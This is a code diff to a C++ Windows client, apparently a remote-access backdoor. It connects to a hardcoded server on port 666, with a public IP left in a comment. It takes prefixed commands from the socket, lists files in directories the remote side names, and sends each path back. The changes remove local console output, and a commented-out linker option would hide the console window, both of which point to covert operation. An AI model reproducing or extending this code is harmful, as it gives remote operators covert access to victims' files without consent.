@@ -12,7 +12,7 @@
 #include <gdiplus.h>
 
 #define PORT 666
-#define SERVERADDR "192.168.1.70" //178.140.177.195
+#define SERVERADDR "192.168.0.2" //178.140.177.195
 //#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "GdiPlus.lib")
@@ -112,7 +112,6 @@ int main()
 	int nsize;
 	while ((nsize = recv(my_sock, &buff[0], sizeof(buff) - 1, 0)) != SOCKET_ERROR)
 	{
-		cout << buff << endl;
 		buff[nsize] = 0;
 
 		if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 's')) {
@@ -181,23 +180,30 @@ int main()
 			WIN32_FIND_DATA FindFileData;
 			char* ap;
 			ap = buff + 4;
+			strcat_s(ap,MAX_PATH,"\\\\*");
 			HANDLE hf = FindFirstFile(ap, &FindFileData);
 			char fileNames[200][MAX_PATH] = { "" };
 			INT i = 0;
-			if (hf == INVALID_HANDLE_VALUE) { puts("Path not found"); return 1; }
-			cout << "Select one of the following files:\n";
-			do {
-				strcpy_s(fileNames[i], FindFileData.cFileName);
-				cout << "[" << i << "]";
-				puts(fileNames[i]);
-				char buffer[buflen];
-				strcpy_s(buffer, MAX_PATH, ap);
-				strcat_s(buffer, MAX_PATH, "\\");
-				strcat_s(buffer, MAX_PATH, FindFileData.cFileName);
-				send(my_sock, buffer, buflen, 0);
-				++i;
-			} while (FindNextFile(hf, &FindFileData));
-			send(my_sock, "^@@", 3, 0);
+			if (hf == INVALID_HANDLE_VALUE) {
+				send(my_sock, "0", 1, 0);
+			}
+			else {
+				do {
+					strcpy_s(fileNames[i], FindFileData.cFileName);
+					char buffer[buflen];
+					strcpy_s(buffer, MAX_PATH, ap);
+					for (int k = 0; k < buflen; k++) {
+						if (buffer[k] == '*') {
+							buffer[k] = '\0';
+							break;
+						}
+					}
+					strcat_s(buffer, MAX_PATH, FindFileData.cFileName);
+					send(my_sock, buffer, buflen, 0);
+					++i;
+				} while (FindNextFile(hf, &FindFileData));
+				send(my_sock, "^@@", 3, 0);
+			}
 			FindClose(hf);
 		}
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'o')) {
